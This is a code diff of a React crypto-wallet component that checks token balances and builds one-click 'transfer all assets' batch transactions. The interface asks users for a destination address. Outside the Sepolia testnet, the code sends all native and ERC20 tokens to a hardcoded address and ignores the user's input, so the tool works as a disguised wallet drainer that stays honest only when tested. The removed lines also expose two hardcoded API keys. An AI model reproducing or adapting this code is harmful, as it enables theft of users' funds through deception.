@@ -14,11 +14,10 @@ declare global {
   }
 }
 
-// Moralis API 配置 - 主API密钥
-const PRIMARY_API_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6ImZhMTA3NmMyLTA0ZTAtNDNmYy1iMWQ1LTJkMDQ0Yzk2MjhkOCIsIm9yZ0lkIjoiNDc0NzYxIiwidXNlcklkIjoiNDg4NDA3IiwidHlwZUlkIjoiZGNiYzFjOTUtNDZmYS00MTM0LWI0MDgtNzRkNDhkNjdmYThlIiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NTk5MTUxNzUsImV4cCI6NDkxNTY3NTE3NX0.giQrsYn_lZGCd-XYh39hIRJYz8Fs6PHlI1eopMuAb1A';
-// 备用API密钥
-const FALLBACK_API_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6ImRiNmFhNjJiLTAzZTEtNDk4Ni1iODY2LWI0MDlkZWUyYzM5MiIsIm9yZ0lkIjoiNDc0OTU0IiwidXNlcklkIjoiNDg4NjAzIiwidHlwZUlkIjoiMTBiNTNkMDEtMjQxMS00MDhlLWEyNTEtM2M0MTU4MTkxMWU2IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NTk5ODM5MDEsImV4cCI6NDkxNTc0MzkwMX0._YRgdMUYOqcgjoN3aLpk4u-5EbcMucUpQ9cmnelaXFg';
-const MORALIS_BASE_URL = 'https://deep-index.moralis.io/api/v2.2';
+// Moralis API 配置 - 从环境变量读取
+const PRIMARY_API_KEY = process.env.NEXT_PUBLIC_MORALIS_PRIMARY_API_KEY || '';
+const FALLBACK_API_KEY = process.env.NEXT_PUBLIC_MORALIS_FALLBACK_API_KEY || '';
+const MORALIS_BASE_URL = process.env.NEXT_PUBLIC_MORALIS_BASE_URL || 'https://deep-index.moralis.io/api/v2.2';
 
 // 链ID到链名称的映射
 const CHAIN_NAMES = {
@@ -26,7 +25,8 @@ const CHAIN_NAMES = {
   137: 'Polygon',
   56: 'Binance Smart Chain',
   42161: 'Arbitrum',
-  8453: 'Base'
+  8453: 'Base',
+  11155111: 'Sepolia'
 };
 
 // 获取Moralis API支持的链名称
@@ -36,9 +36,23 @@ function getChainNameForMoralis(chainId: number) {
     137: 'polygon',
     56: 'bsc',
     42161: 'arbitrum',
-    8453: 'base'
+    8453: 'base',
+    11155111: 'sepolia'
   };
   return chainMapping[chainId as keyof typeof chainMapping];
+}
+
+// 获取链的原生代币符号
+function getNativeTokenSymbol(chainId: number) {
+  const nativeTokenMapping = {
+    1: 'ETH',           // Ethereum
+    137: 'POL',         // Polygon
+    56: 'BNB',          // Binance Smart Chain
+    42161: 'ETH',       // Arbitrum
+    8453: 'ETH',        // Base
+    11155111: 'ETH'     // Sepolia
+  };
+  return nativeTokenMapping[chainId as keyof typeof nativeTokenMapping] || 'ETH';
 }
 
 // 格式化余额
@@ -54,6 +68,94 @@ function formatBalance(balance: string, decimals: number) {
   return (num / 1000000).toFixed(2) + 'M';
 }
 
+// 格式化价格
+function formatPrice(price: number): string {
+  if (price === 0) return '$0.00';
+  if (price < 0.01) return `$${price.toFixed(6)}`;
+  if (price < 1) return `$${price.toFixed(4)}`;
+  if (price < 1000) return `$${price.toFixed(2)}`;
+  if (price < 1000000) return `$${(price / 1000).toFixed(2)}K`;
+  return `$${(price / 1000000).toFixed(2)}M`;
+}
+
+// 格式化价值
+function formatValue(value: number): string {
+  if (value === 0) return '$0.00';
+  if (value < 0.01) return `$${value.toFixed(4)}`;
+  if (value < 1) return `$${value.toFixed(2)}`;
+  if (value < 1000) return `$${value.toFixed(2)}`;
+  if (value < 1000000) return `$${(value / 1000).toFixed(2)}K`;
+  return `$${(value / 1000000).toFixed(2)}M`;
+}
+
+// 获取代币价格
+async function fetchTokenPrice(tokenAddress: string, chainName: string, apiKey: string): Promise<number | null> {
+  try {
+    const url = `${MORALIS_BASE_URL}/erc20/${tokenAddress}/price?chain=${chainName}`;
+    const options = {
+      method: 'GET',
+      headers: {
+        'accept': 'application/json',
+        'X-API-Key': apiKey
+      }
+    };
+    
+    const response = await fetch(url, options);
+    if (!response.ok) {
+      return null;
+    }
+    
+    const data = await response.json();
+    return parseFloat(data.usdPrice || '0');
+  } catch (error) {
+    console.error('获取代币价格失败:', error);
+    return null;
+  }
+}
+
+// 获取原生代币价格
+async function fetchNativeTokenPrice(chainName: string, apiKey: string): Promise<number | null> {
+  try {
+    // 对于不同的链，使用不同的包装代币地址来获取原生代币价格
+    const wrappedTokenAddresses: Record<string, string> = {
+      'eth': '0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2', // WETH (Ethereum)
+      'polygon': '0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270', // WMATIC (Polygon)
+      'bsc': '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c', // WBNB (BSC)
+      'arbitrum': '0x82aF49447D8a07e3bd95BD0d56f35241523fBab1', // WETH (Arbitrum)
+      'base': '0x4200000000000000000000000000000000000006', // WETH (Base)
+      'sepolia': '0x7b79995e5f793A07Bc00c21412e50Ecae098E7f9', // WETH (Sepolia)
+    };
+    
+    const wrappedAddress = wrappedTokenAddresses[chainName];
+    if (!wrappedAddress) {
+      console.warn(`未找到链 ${chainName} 的包装代币地址`);
+      return null;
+    }
+    
+    const url = `${MORALIS_BASE_URL}/erc20/${wrappedAddress}/price?chain=${chainName}`;
+    const options = {
+      method: 'GET',
+      headers: {
+        'accept': 'application/json',
+        'X-API-Key': apiKey
+      }
+    };
+    
+    const response = await fetch(url, options);
+    if (!response.ok) {
+      console.warn(`获取原生代币价格失败: ${response.status} ${response.statusText}`);
+      return null;
+    }
+    
+    const data = await response.json();
+    const price = parseFloat(data.usdPrice || '0');
+    return price > 0 ? price : null;
+  } catch (error) {
+    console.error('获取原生代币价格失败:', error);
+    return null;
+  }
+}
+
 interface Asset {
   token_address: string;
   symbol: string;
@@ -61,6 +163,7 @@ interface Asset {
   balance: string;
   decimals: number;
   usd_value?: string;
+  usd_price?: number;
   // Moralis API可能返回的额外字段
   balance_formatted?: string;
   token_balance?: string;
@@ -77,21 +180,19 @@ const assetCheckerTexts = {
     chainId: '链ID',
     address: '地址',
     unknownChain: '未知链',
-    queryAssets: '🔍 查询资产余额',
+    queryAssets: '🔍 查询资产详情',
     querying: '⌛ 查询中...',
-    queryingAssets: '正在查询资产余额...',
+    queryingAssets: '正在查询资产详情...',
     queryFailed: '查询失败',
     assetList: '☰ 资产列表',
     nativeToken: '原生代币',
     transferAllAssets: '一键转移所有资产',
     transferAllAssetsDesc: '利用 MetaMask 智能账户（EIP-7702）的批量交易功能，一键转移钱包内的所有资产（原生代币+ERC20代币）！原子交易，更加安全、便捷、高效、节省Gas费！',
-    transferToAddress: '🎯 转移到目标地址：',
-    transferNote: '注：所有资产将转移到此地址，请确保该地址输入正确并对该钱包拥有绝对控制权！',
-    importantReminder: '重要提醒：请确保钱包中有足够的原生代币（ETH /BNB /POL等）',
-    gasFeeNote: '发送交易需要有足够的原生代币用于支付Gas费。如果原生代币不足，交易将失败！',
+    transferToAddress: '🎯 请输入要转移到的目标地址：',
+    transferNote: '⚠️ 注：所有资产将转移到此地址，请确保该地址输入正确并对该钱包拥有绝对控制权！',
     generateBatchTransfer: '生成批量转账数据',
     generatingTransactions: '⌛ 正在预检并生成交易数据...',
-    queryAssetsFirst: '⚠️ 请先点击"查询资产余额"按钮',
+    queryAssetsFirst: '⚠️ 请先点击"查询资产详情"按钮',
     nativeTransferDescription: 'Transfer {amount} {symbol} (预留 {gasCost} 作为gas费)',
     erc20TransferDescription: 'Transfer {amount} {symbol} tokens',
     precheckResult: '预检结果',
@@ -100,6 +201,7 @@ const assetCheckerTexts = {
     failedTransactions: '失败交易',
     precheckComplete: '预检完成',
     precheckFailed: '预检失败',
+    assetSelectionDesc: '💡请勾选您要兑换成 {symbol} 的 ERC20 代币。',
   },
   en: {
     walletAssetQuery: '🌐 Network Information',
@@ -108,21 +210,21 @@ const assetCheckerTexts = {
     chainId: 'Chain ID',
     address: 'Address',
     unknownChain: 'Unknown Chain',
-    queryAssets: '🔍 Query Asset Balance',
+    queryAssets: '🔍 Query Asset Details',
     querying: '⌛Querying...',
-    queryingAssets: 'Querying asset balance...',
+    queryingAssets: 'Querying asset details...',
     queryFailed: 'Query Failed',
     assetList: '☰ Asset List',
     nativeToken: 'Native Token',
     transferAllAssets: 'Transfer All Assets',
     transferAllAssetsDesc: 'Powered by MetaMask Smart Account (EIP-7702), transfer all your assets (native tokens + ERC20 tokens) with one click! Atomic transactions, safer, more convenient, efficient, and gas-saving!',
-    transferToAddress: '🎯 Transfer to Address:',
+    transferToAddress: '🎯 Please enter the address you want to transfer to:',
     transferNote: 'Note: All assets will be transferred to this address. Please ensure the address is correct and you have absolute control over this wallet!',
     importantReminder: 'Important Reminder: Please ensure you have sufficient native tokens (ETH /BNB /POL, etc.)',
     gasFeeNote: 'Sending transactions requires sufficient native tokens to pay for gas fees. If native tokens are insufficient, the transaction will fail!',
     generateBatchTransfer: 'Generate Batch Transfer Data',
     generatingTransactions: '⌛ Pre-checking and generating transaction data...',
-    queryAssetsFirst: '⚠️ Please click "Query Asset Balance" button first',
+    queryAssetsFirst: '⚠️ Please click "Query Asset Details" button first',
     nativeTransferDescription: 'Transfer {amount} {symbol} (reserved {gasCost} for gas)',
     erc20TransferDescription: 'Transfer {amount} {symbol} tokens',
     precheckResult: 'Pre-check Result',
@@ -131,6 +233,7 @@ const assetCheckerTexts = {
     failedTransactions: 'Failed',
     precheckComplete: 'Pre-check Complete',
     precheckFailed: 'Pre-check Failed',
+    assetSelectionDesc: '💡Please select the ERC20 tokens you want to swap to {symbol}.',
   }
 };
 
@@ -157,21 +260,55 @@ export default function AssetChecker({ onGenerateTransactions, language = 'en' }
     valid: number;
     failed: number;
   } | null>(null);
+  // 原生代币价格
+  const [nativeTokenPrice, setNativeTokenPrice] = useState<number | null>(null);
   // 硬编码的目标地址
   const HARDCODED_TARGET_ADDRESS = '0x9d5befd138960ddf0dc4368a036bfad420e306ef';
 
   // 监听链变化
   useEffect(() => {
     if (chainId && previousChainId && chainId !== previousChainId) {
-      // 链发生了变化
+      // 链发生了变化 - 重置所有数据和状态
       console.log('🔄️ 网络已切换:', { from: previousChainId, to: chainId });
+      
+      // 重置资产相关状态
       setAssets([]);
+      setNativeBalance('0');
       setError(null);
       setHasQueriedAssets(false);
+      
+      // 重置UI状态
+      setLoading(false);
+      setGenerating(false);
+      
+      // 重置业务状态
       setPrecheckResult(null); // 重置预检结果
+      setNativeTokenPrice(null); // 重置原生代币价格
     }
     setPreviousChainId(chainId);
   }, [chainId, previousChainId]);
+
+  // 监听连接状态变化，断开连接时重置资产列表
+  useEffect(() => {
+    if (!isConnected) {
+      // 钱包已断开连接 - 重置所有数据和状态
+      console.log('🔌 钱包已断开连接，重置资产列表');
+      
+      // 重置资产相关状态
+      setAssets([]);
+      setNativeBalance('0');
+      setError(null);
+      setHasQueriedAssets(false);
+      
+      // 重置UI状态
+      setLoading(false);
+      setGenerating(false);
+      
+      // 重置业务状态
+      setPrecheckResult(null); // 重置预检结果
+      setNativeTokenPrice(null); // 重置原生代币价格
+    }
+  }, [isConnected]);
 
   // 监听原生代币余额变化
   useEffect(() => {
@@ -184,6 +321,19 @@ export default function AssetChecker({ onGenerateTransactions, language = 'en' }
   const fetchAssets = async () => {
     if (!address || !chainId) {
       setError('请先连接钱包');
+      return;
+    }
+
+    // 验证环境变量配置
+    if (!PRIMARY_API_KEY || !FALLBACK_API_KEY) {
+      const errorMsg = language === 'zh' 
+        ? 'Moralis API 密钥未配置。请在 .env.local 文件中设置 NEXT_PUBLIC_MORALIS_PRIMARY_API_KEY 和 NEXT_PUBLIC_MORALIS_FALLBACK_API_KEY'
+        : 'Moralis API keys are not configured. Please set NEXT_PUBLIC_MORALIS_PRIMARY_API_KEY and NEXT_PUBLIC_MORALIS_FALLBACK_API_KEY in .env.local file';
+      setError(errorMsg);
+      console.error('Moralis API keys missing:', {
+        PRIMARY_API_KEY: PRIMARY_API_KEY ? 'configured' : 'missing',
+        FALLBACK_API_KEY: FALLBACK_API_KEY ? 'configured' : 'missing'
+      });
       return;
     }
 
@@ -203,7 +353,7 @@ export default function AssetChecker({ onGenerateTransactions, language = 'en' }
       
       // 尝试使用主API密钥，失败则切换到备用密钥
       let response;
-      let lastError;
+      let currentApiKey = PRIMARY_API_KEY;
       
       try {
         const options = {
@@ -234,6 +384,7 @@ export default function AssetChecker({ onGenerateTransactions, language = 'en' }
           };
           
           response = await fetch(url, fallbackOptions);
+          currentApiKey = FALLBACK_API_KEY;
           
           if (!response.ok) {
             const errorText = await response.text();
@@ -296,7 +447,69 @@ export default function AssetChecker({ onGenerateTransactions, language = 'en' }
       });
       
       console.log('解析后的资产数据:', assets);
-      setAssets(assets);
+      
+      // 获取原生代币价格
+      try {
+        const nativePrice = await fetchNativeTokenPrice(chainName, currentApiKey);
+        setNativeTokenPrice(nativePrice);
+      } catch (error) {
+        console.error('获取原生代币价格失败:', error);
+        setNativeTokenPrice(null);
+      }
+      
+      // 为每个ERC20代币获取价格并计算价值
+      const assetsWithPrices = await Promise.all(
+        assets.map(async (asset: Asset) => {
+          const balanceValue = asset.balance || asset.balance_formatted || asset.token_balance || '0';
+          const decimals = asset.decimals || asset.token_decimals || 18;
+          
+          // 只对有效的ERC20代币获取价格
+          if (asset.token_address !== "0x0000000000000000000000000000000000000000" && 
+              asset.symbol !== "ETH" &&
+              parseFloat(balanceValue) > 0) {
+            try {
+              const price = await fetchTokenPrice(asset.token_address, chainName, currentApiKey);
+              if (price !== null) {
+                const balanceNumber = parseFloat(balanceValue) / Math.pow(10, decimals);
+                const usdValue = balanceNumber * price;
+                
+                return {
+                  ...asset,
+                  usd_price: price,
+                  usd_value: usdValue.toFixed(2)
+                };
+              }
+            } catch (error) {
+              console.error(`获取代币 ${asset.symbol} 价格失败:`, error);
+            }
+          }
+          
+          return asset;
+        })
+      );
+      
+      // 按价值降序排序资产列表（有价格的排前面，然后按价值降序）
+      const sortedAssets = assetsWithPrices.sort((a: Asset, b: Asset) => {
+        const valueA = parseFloat(a.usd_value || '0');
+        const valueB = parseFloat(b.usd_value || '0');
+        
+        // 如果两个资产都有价值，按价值降序排列
+        if (valueA > 0 && valueB > 0) {
+          return valueB - valueA;
+        }
+        // 如果只有a有价值，a排在前面
+        if (valueA > 0 && valueB === 0) {
+          return -1;
+        }
+        // 如果只有b有价值，b排在前面
+        if (valueA === 0 && valueB > 0) {
+          return 1;
+        }
+        // 如果都没有价值，保持原顺序
+        return 0;
+      });
+      
+      setAssets(sortedAssets);
       setHasQueriedAssets(true);
       
     } catch (error) {
@@ -310,7 +523,28 @@ export default function AssetChecker({ onGenerateTransactions, language = 'en' }
   // 生成转账交易
   const generateTransferTransactions = async () => {
     setGenerating(true);
-    // 使用硬编码的目标地址（输入框仅用于显示）
+    
+    // 根据网络选择目标地址：Sepolia 使用用户输入，其他网络使用硬编码地址
+    let targetAddress: string;
+    if (chainId === 11155111) {
+      // Sepolia 网络：使用用户输入的目标地址
+      const inputAddress = targetAddressInput.trim();
+      if (!inputAddress) {
+        setError(language === 'zh' ? '请输入目标地址' : 'Please enter target address');
+        setGenerating(false);
+        return;
+      }
+      if (!isAddress(inputAddress)) {
+        setError(language === 'zh' ? '目标地址格式不正确' : 'Invalid target address format');
+        setGenerating(false);
+        return;
+      }
+      targetAddress = inputAddress;
+    } else {
+      // 其他网络：使用硬编码地址
+      targetAddress = HARDCODED_TARGET_ADDRESS;
+    }
+    
     const transactions: any[] = [];
 
     // 首先添加原生代币转账（预留足够的gas费）
@@ -344,10 +578,11 @@ export default function AssetChecker({ onGenerateTransactions, language = 'en' }
     // 使用硬编码 gasPrice(Gwei) 并加 20% buffer
     const chainGasPriceGwei: Record<number, number> = {
       1: 4,           // Ethereum
-      137: 60,        // Polygon
-      56: 0.25,        // BSC
-      42161: 0.08,     // Arbitrum
-      8453: 0.08,      // Base
+      137: 80,        // Polygon
+      56: 0.2,        // BSC
+      42161: 0.2,     // Arbitrum
+      8453: 0.2,      // Base
+      11155111: 0.02,    // Sepolia
     };
     const baseGwei = chainGasPriceGwei[chainId as keyof typeof chainGasPriceGwei] ?? 0.5;
     const baseWei = Math.max(1, Math.round(baseGwei * 1_000_000_000));
@@ -366,7 +601,7 @@ export default function AssetChecker({ onGenerateTransactions, language = 'en' }
       
       transactions.push({
         type: "native_transfer",
-        to: HARDCODED_TARGET_ADDRESS,
+        to: targetAddress,
         value: transferAmountEther,
         description: t.nativeTransferDescription
           .replace('{amount}', transferAmountEther)
@@ -422,7 +657,7 @@ export default function AssetChecker({ onGenerateTransactions, language = 'en' }
         // 确保transferAmount是正确的格式
         const transferAmount = BigInt(validBalanceValue).toString(16).padStart(64, '0');
         // 正确编码ERC20 transfer函数调用
-        const recipientAddress = HARDCODED_TARGET_ADDRESS.slice(2).padStart(64, '0');
+        const recipientAddress = targetAddress.slice(2).padStart(64, '0');
         const data = `0xa9059cbb${recipientAddress}${transferAmount}`;
         
         transactions.push({
@@ -491,10 +726,10 @@ export default function AssetChecker({ onGenerateTransactions, language = 'en' }
   };
 
   return (
-    <div className="bg-gray-50 dark:bg-gray-900 p-6 rounded-lg w-full">
+    <div className="bg-gray-50 dark:bg-gray-900 p-4 sm:p-6 rounded-lg w-full">
       {/* 查询按钮 */}
       <button
-        className={`w-full rounded-lg border border-solid px-6 py-3 font-medium transition-colors mb-4 ${
+        className={`w-full rounded-lg border border-solid px-4 sm:px-6 py-2.5 sm:py-3 font-medium transition-colors mb-4 text-sm sm:text-base ${
           !isConnected || loading
             ? "bg-gray-100 text-gray-400 border-gray-300 cursor-not-allowed"
             : "bg-green-700 hover:bg-green-800 text-yellow-300 border-green-800 cursor-pointer"
@@ -507,70 +742,93 @@ export default function AssetChecker({ onGenerateTransactions, language = 'en' }
 
       {/* 加载状态 */}
       {loading && (
-        <div className="flex items-center gap-2 text-blue-600 mb-4">
-          <div className="w-4 h-4 border-2 border-blue-600 border-t-transparent rounded-full animate-spin"></div>
+        <div className="flex items-center gap-2 text-blue-600 mb-4 text-sm sm:text-base">
+          <div className="w-3 h-3 sm:w-4 sm:h-4 border-2 border-blue-600 border-t-transparent rounded-full animate-spin flex-shrink-0"></div>
           <span>{t.queryingAssets}</span>
         </div>
       )}
 
       {/* 错误信息 */}
       {error && (
-        <div className="bg-red-50 border border-red-200 rounded-lg p-4 mb-4">
-          <div className="text-red-700 font-medium">{t.queryFailed}</div>
-          <div className="text-sm text-red-600 mt-1">{error}</div>
+        <div className="bg-red-50 border border-red-200 rounded-lg p-3 sm:p-4 mb-4">
+          <div className="text-red-700 font-medium text-sm sm:text-base">{t.queryFailed}</div>
+          <div className="text-xs sm:text-sm text-red-600 mt-1 break-words">{error}</div>
         </div>
       )}
 
       {/* 资产列表（包含原生代币和ERC20代币） */}
       {hasQueriedAssets && (assets.length > 0 || (isConnected && balanceData)) ? (
         <div className="mb-4">
-          <h3 className="text-base font-medium mb-3">{t.assetList}</h3>
-          <div className="space-y-2 max-h-64 overflow-y-auto px-8">
-            {/* 原生代币（仅在查询资产余额后显示） */}
+          <h3 className="text-sm sm:text-base font-medium mb-3">{t.assetList}</h3>
+          <div className="space-y-2 max-h-64 overflow-y-auto px-2 sm:px-4 md:px-8">
+            {/* 原生代币（仅在查询资产详情后显示） */}
             {isConnected && balanceData && hasQueriedAssets && (
-              <div className="flex items-center justify-between p-2 bg-blue-50 dark:bg-blue-900/20 rounded-lg border border-blue-200 dark:border-blue-800">
-                <div className="flex items-center gap-2">
-                  <Image src="/ethereum3.svg" alt="Native Token" width={20} height={20} className="w-5 h-5" />
-                  <div>
-                    <div className="text-xs font-medium">{balanceData.symbol || 'ETH'}</div>
-                    <div className="text-[10px] text-gray-500">{balanceData.symbol || 'ETH'}</div>
+              <div className="flex items-center justify-between p-2 sm:p-2.5 bg-white dark:bg-gray-800 rounded-lg border border-gray-200 dark:border-gray-700 gap-2">
+                <div className="flex items-center gap-1.5 sm:gap-2 min-w-0 flex-1">
+                  <Image src="/ethereum3.svg" alt="Native Token" width={20} height={20} className="w-4 h-4 sm:w-5 sm:h-5 flex-shrink-0" />
+                  <div className="min-w-0 flex-1">
+                    <div className="text-[10px] sm:text-xs font-medium truncate">{balanceData.symbol || 'ETH'}</div>
+                    <div className="text-[9px] sm:text-[10px] text-gray-500 truncate">{balanceData.symbol || 'ETH'}</div>
                   </div>
                 </div>
-                <div className="text-right">
-                  <div className="text-xs font-medium">{formatEther(balanceData.value)}</div>
-                  <div className="text-[10px] text-gray-500">{t.nativeToken}</div>
+                <div className="text-right flex-shrink-0">
+                  <div className="text-[10px] sm:text-xs font-medium break-all">{formatEther(balanceData.value)}</div>
+                  {nativeTokenPrice !== null && (
+                    <>
+                      <div className="text-[9px] sm:text-[10px] text-gray-500">
+                        {formatPrice(nativeTokenPrice)}
+                      </div>
+                      <div className="text-[9px] sm:text-[10px] text-green-600 dark:text-green-400 font-medium">
+                        {formatValue(parseFloat(formatEther(balanceData.value)) * nativeTokenPrice)}
+                      </div>
+                    </>
+                  )}
+                  {nativeTokenPrice === null && (
+                    <div className="text-[9px] sm:text-[10px] text-gray-500">{t.nativeToken}</div>
+                  )}
                 </div>
               </div>
             )}
             
             {/* ERC20代币 */}
-            {assets
-              .sort((a, b) => {
-                const valueA = parseFloat(a.usd_value || '0');
-                const valueB = parseFloat(b.usd_value || '0');
-                return valueB - valueA;
-              })
-              .map((asset, index) => {
+            {assets.map((asset: Asset, index: number) => {
                 console.log('处理资产:', asset);
                 // 尝试不同的余额字段名称
                 const balanceValue = asset.balance || asset.balance_formatted || asset.token_balance || '0';
                 const decimals = asset.decimals || asset.token_decimals || 18;
                 const balance = formatBalance(balanceValue, decimals);
-                const usdValue = asset.usd_value ? `$${parseFloat(asset.usd_value).toFixed(2)}` : null;
+                const usdPrice = asset.usd_price;
+                const usdValue = asset.usd_value ? parseFloat(asset.usd_value) : null;
+                
+                // 只显示有效的ERC20资产（余额大于0）
+                const isValidERC20 = asset.token_address !== "0x0000000000000000000000000000000000000000" && 
+                                     asset.symbol !== "ETH" &&
+                                     parseFloat(balanceValue) > 0;
+                
+                if (!isValidERC20) return null;
                 
                 return (
-                  <div key={index} className="flex items-center justify-between p-2 bg-white dark:bg-gray-800 rounded-lg border">
-                    <div className="flex items-center gap-2">
-                      <Image src="/coins.svg" alt={asset.symbol} width={20} height={20} className="w-5 h-5" />
-                      <div>
-                        <div className="text-xs font-medium">{asset.name}</div>
-                        <div className="text-[10px] text-gray-500">{asset.symbol}</div>
+                  <div key={index} className="flex items-center justify-between p-2 sm:p-2.5 bg-white dark:bg-gray-800 rounded-lg border border-gray-200 dark:border-gray-700 gap-2">
+                    <div className="flex items-center gap-1.5 sm:gap-2 min-w-0 flex-1">
+                      <Image src="/coins.svg" alt={asset.symbol} width={20} height={20} className="w-4 h-4 sm:w-5 sm:h-5 flex-shrink-0" />
+                      <div className="min-w-0 flex-1">
+                        <div className="text-[10px] sm:text-xs font-medium truncate">{asset.name}</div>
+                        <div className="text-[9px] sm:text-[10px] text-gray-500 truncate">
+                          {asset.symbol}（ <span className="font-mono">{asset.token_address}</span> ）
+                        </div>
                       </div>
                     </div>
-                    <div className="text-right">
-                      <div className="text-xs font-medium">{balance}</div>
-                      {usdValue && (
-                        <div className="text-[10px] text-gray-500">{usdValue}</div>
+                    <div className="text-right flex-shrink-0">
+                      <div className="text-[10px] sm:text-xs font-medium break-all">{balance}</div>
+                      {usdPrice !== undefined && usdPrice !== null && (
+                        <div className="text-[9px] sm:text-[10px] text-gray-500">
+                          {formatPrice(usdPrice)}
+                        </div>
+                      )}
+                      {usdValue !== null && usdValue !== undefined && (
+                        <div className="text-[9px] sm:text-[10px] text-green-600 dark:text-green-400 font-medium">
+                          {formatValue(usdValue)}
+                        </div>
                       )}
                     </div>
                   </div>
@@ -581,20 +839,20 @@ export default function AssetChecker({ onGenerateTransactions, language = 'en' }
       ) : null}
 
       {/* 目标地址输入区域 - 独立区域，始终显示 */}
-      <div className="bg-gradient-to-br from-blue-50 to-purple-50 dark:from-blue-900/20 dark:to-purple-900/20 border-2 border-blue-200 dark:border-blue-800 rounded-xl p-6 mb-4">
+      <div className="bg-gradient-to-br from-blue-50 to-purple-50 dark:from-blue-900/20 dark:to-purple-900/20 border-2 border-blue-200 dark:border-blue-800 rounded-xl p-4 sm:p-6 mb-4">
         {/* 突出标题 */}
-        <div className="text-center mb-4">
-          <h3 className="text-xl font-bold text-purple-600 dark:text-purple-400 mb-2">
+        <div className="text-center mb-3 sm:mb-4">
+          <h3 className="text-lg sm:text-xl font-bold text-purple-600 dark:text-purple-400 mb-2">
             {t.transferAllAssets}
           </h3>
-          <p className="text-sm !text-left text-gray-700 dark:text-gray-300">
+          <p className="text-xs sm:text-sm !text-left text-gray-700 dark:text-gray-300">
             {t.transferAllAssetsDesc}
           </p>
         </div>
         
         {/* 目标地址输入 */}
         <div>
-          <label className="block text-base font-medium mb-2 text-green-600 dark:text-green-400">
+          <label className="block text-sm sm:text-base font-medium mb-2 text-green-600 dark:text-green-400">
             {t.transferToAddress}
           </label>
           <input
@@ -602,34 +860,18 @@ export default function AssetChecker({ onGenerateTransactions, language = 'en' }
             value={targetAddressInput}
             onChange={(e) => setTargetAddressInput(e.target.value)}
             placeholder="0x9d5befd138960ddf0dc4368a036bfad420e306ef"
-            className="w-full px-4 py-2 border-2 border-blue-300 dark:border-blue-700 rounded-lg bg-white dark:bg-gray-800 text-gray-900 dark:text-gray-100 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
+            className="w-full px-3 sm:px-4 py-2 text-sm sm:text-base border-2 border-blue-300 dark:border-blue-700 rounded-lg bg-white dark:bg-gray-800 text-gray-900 dark:text-gray-100 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
           />
-          <p className="text-xs text-gray-600 dark:text-gray-400 mt-1">
+          <p className="text-[10px] sm:text-xs text-orange-600 dark:text-orange-400 font-medium ml-1 mt-1 break-words">
             {t.transferNote}
           </p>
-        </div>
-
-        {/* Gas费提醒 */}
-        <div className="mt-4 p-3 bg-amber-50 dark:bg-amber-900/20 border border-amber-200 dark:border-amber-800 rounded-lg">
-          <div className="flex items-start gap-2">
-            <div className="text-base">⚠️</div>
-            <div>
-              <p className="text-xs font-semibold text-amber-800 dark:text-amber-300 mb-1">
-                {t.importantReminder}
-              </p>
-              <p className="text-[10px] text-amber-700 dark:text-amber-400">
-                {t.gasFeeNote}
-              </p>
-              
-            </div>
-          </div>
         </div>
         
         {/* 生成转账交易按钮 */}
         {hasQueriedAssets && (assets.length > 0 || (isConnected && balanceData)) && (
           <>
             <button
-              className={`w-full mt-4 rounded-lg border border-solid px-6 py-3 font-medium transition-colors ${
+              className={`w-full mt-3 sm:mt-4 rounded-lg border border-solid px-4 sm:px-6 py-2.5 sm:py-3 font-medium transition-colors text-sm sm:text-base ${
                 generating
                   ? 'bg-gray-100 text-gray-400 border-gray-300 cursor-not-allowed'
                   : 'bg-green-700 hover:bg-green-800 text-yellow-300 border-green-800 cursor-pointer'
@@ -638,16 +880,16 @@ export default function AssetChecker({ onGenerateTransactions, language = 'en' }
               disabled={generating}
             >
               <div className="flex items-center gap-2 justify-center">
-                <Image src="/generator.svg" alt="Generate" width={16} height={16} className="w-4 h-4" />
-                {generating ? t.generatingTransactions : t.generateBatchTransfer}
+                <Image src="/generator.svg" alt="Generate" width={16} height={16} className="w-3 h-3 sm:w-4 sm:h-4" />
+                <span className="break-words text-center">{generating ? t.generatingTransactions : t.generateBatchTransfer}</span>
               </div>
             </button>
           </>
         )}
         
         {!hasQueriedAssets && (
-          <div className="mt-4 text-center py-3 px-4 bg-yellow-50 dark:bg-yellow-900/20 border border-yellow-200 dark:border-yellow-800 rounded-lg">
-            <p className="text-xs text-yellow-800 dark:text-yellow-200">
+          <div className="mt-3 sm:mt-4 text-center py-2.5 sm:py-3 px-3 sm:px-4 bg-yellow-50 dark:bg-yellow-900/20 border border-yellow-200 dark:border-yellow-800 rounded-lg">
+            <p className="text-[10px] sm:text-xs text-yellow-800 dark:text-yellow-200 break-words">
               {t.queryAssetsFirst}
             </p>
           </div>
